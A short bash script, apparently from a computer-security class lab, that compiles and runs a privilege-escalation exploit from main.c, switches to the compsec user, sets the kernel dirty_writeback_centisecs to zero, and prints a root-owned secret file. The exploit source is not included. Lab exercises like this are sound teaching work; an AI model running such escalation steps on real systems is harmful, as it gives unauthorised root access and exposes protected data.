#!/bin/bash

echo Escelating privileges please wait...
gcc main.c -o attack -lpthread
./attack
sleep 7s

echo "Please enter password for compsec:"
su compsec

echo "Disabling dirty_writeback..."
echo 0 > /proc/sys/vm/dirty_writeback_centisec

echo "The secret is:"
cat /root/secrets/student1/secret